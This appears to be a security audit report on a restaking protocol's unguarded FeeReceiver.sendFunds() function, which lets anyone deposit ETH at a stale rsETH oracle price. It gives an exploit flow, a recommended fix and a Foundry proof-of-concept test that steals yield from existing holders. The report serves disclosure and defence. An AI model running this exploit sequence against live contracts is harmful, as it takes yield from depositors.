Audit Report

## Title
Unguarded `FeeReceiver.sendFunds()` Enables Stale-Price Deposit to Steal Accumulated Yield — (`contracts/FeeReceiver.sol`)

## Summary
`FeeReceiver.sendFunds()` carries no access-control modifier, allowing any caller to flush accumulated MEV/execution-layer rewards into `LRTDepositPool` at will. Because `LRTOracle.rsETHPrice` is a stored value only refreshed by an explicit `updateRSETHPrice()` call, a window exists between the TVL increase and the next oracle update. During this window, an attacker can deposit ETH at the stale (pre-reward) price, receiving more rsETH than is fair, thereby siphoning accumulated yield from existing holders.

## Finding Description

**Root cause — No access control on `sendFunds()`:**
`FeeReceiver.sendFunds()` is declared `external` with no role modifier, allowing any EOA or contract to call it. [1](#0-0) 

**`receiveFromRewardReceiver` is also unguarded:**
ETH is accepted unconditionally; `address(this).balance` of the deposit pool increases immediately upon the call. [2](#0-1) 

**TVL is read live; oracle price is stale:**
`getETHDistributionData()` reads `address(this).balance` directly, so TVL reflects the reward flush immediately. [3](#0-2) 

`rsETHPrice` is a stored state variable, not computed on-the-fly. [4](#0-3) 

It is only updated when `updateRSETHPrice()` is explicitly called. [5](#0-4) 

**Deposit uses the stale stored price:**
`getRsETHAmountToMint` divides by `lrtOracle.rsETHPrice()`, which returns the stored (pre-reward) value. After `sendFunds()` increases TVL but before the oracle is updated, this price is lower than the true post-reward price, so the attacker receives more rsETH than is fair. [6](#0-5) 

**Exploit flow:**
1. Wait for `FeeReceiver` to accumulate meaningful rewards `R`.
2. Call `FeeReceiver.sendFunds()` — flushes `R` ETH into `LRTDepositPool`, TVL increases to `T + R`.
3. Call `LRTDepositPool.depositETH{value: D}(0, "")` — rsETH minted at stale price `T/S` instead of fair price `(T+R)/S`. Attacker receives `D·S/T` rsETH instead of the fair `D·S/(T+R)`.
4. Oracle is eventually updated (by anyone, or by the attacker if the price increase is within `pricePercentageLimit`). Attacker's excess rsETH is now worth real ETH.

**Why existing checks fail:**
- `nonReentrant` and `whenNotPaused` on `depositETH` do not enforce oracle freshness.
- The `pricePercentageLimit` guard in `_updateRsETHPrice()` only blocks the oracle update call if the price jump is too large; it does not prevent the deposit at the stale price, and for typical small reward accumulations the limit is not breached. [7](#0-6) 

## Impact Explanation
**High — Theft of unclaimed yield.**

Existing rsETH holders' proportional claim on the accumulated rewards `R` is diluted. The attacker's extra rsETH, valued at approximately `D·R/(T+R)` ETH after the oracle update, is a direct transfer of yield from existing holders to the attacker. The attack is repeatable every time a meaningful balance builds up in `FeeReceiver`.

## Likelihood Explanation
- `sendFunds()` requires no privileges and has no preconditions.
- `updateRSETHPrice()` is `public`, so the attacker controls the oracle refresh timing when the price increase is within the configured limit.
- The attack requires only two sequential transactions (`sendFunds()` then `depositETH()`), executable by any EOA.
- No privileged access, leaked keys, or external protocol compromise is needed.
- Rewards accumulate continuously, making the attack repeatable.

## Recommendation
Add an access-control guard to `sendFunds()`, restricting it to the `MANAGER` role already configured in `initialize`:

```solidity
function sendFunds() external onlyRole(LRTConstants.MANAGER) {
    uint256 balance = address(this).balance;
    ILRTDepositPool(depositPool).receiveFromRewardReceiver{ value: balance }();
    emit MevRewardsAddedToTVL(balance);
}
```

Additionally, consider atomically calling `updateRSETHPrice()` within the same transaction as `sendFunds()` (or inside `receiveFromRewardReceiver`) so the oracle price is always consistent with TVL at the time of any subsequent deposit.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

// Foundry fork test — run against a mainnet/testnet fork
// Precondition: FeeReceiver has accumulated R = 10 ETH in rewards
//               LRTDepositPool TVL T = 10_000 ETH, rsETH supply S = 9_900 rsETH

contract PoC is Test {
    FeeReceiver feeReceiver = FeeReceiver(FEE_RECEIVER_ADDR);
    LRTDepositPool pool     = LRTDepositPool(DEPOSIT_POOL_ADDR);
    LRTOracle oracle        = LRTOracle(ORACLE_ADDR);
    IRSETH rsETH            = IRSETH(RSETH_ADDR);

    function testStealYield() external {
        address attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);

        vm.startPrank(attacker);

        // Step 1: flush rewards into deposit pool (no access control)
        feeReceiver.sendFunds();

        // Step 2: deposit at stale (pre-reward) price
        uint256 rsETHBefore = rsETH.balanceOf(attacker);
        pool.depositETH{value: 100 ether}(0, "");
        uint256 rsETHReceived = rsETH.balanceOf(attacker) - rsETHBefore;

        // Step 3: trigger oracle update (public function)
        oracle.updateRSETHPrice();
        uint256 priceAfter = oracle.rsETHPrice();

        // Step 4: attacker received more rsETH than fair
        uint256 fairRsETH = 100 ether * 1e18 / priceAfter;
        assertGt(rsETHReceived, fairRsETH, "attacker received excess rsETH");

        // Step 5: attacker's rsETH is worth more than 100 ETH deposited
        uint256 attackerETHValue = rsETHReceived * priceAfter / 1e18;
        assertGt(attackerETHValue, 100 ether, "attacker profited from stolen yield");

        vm.stopPrank();
    }
}
```

The test demonstrates that by calling `sendFunds()` before depositing, the attacker receives rsETH at the pre-reward price, capturing a share of the accumulated yield that belongs to existing holders.
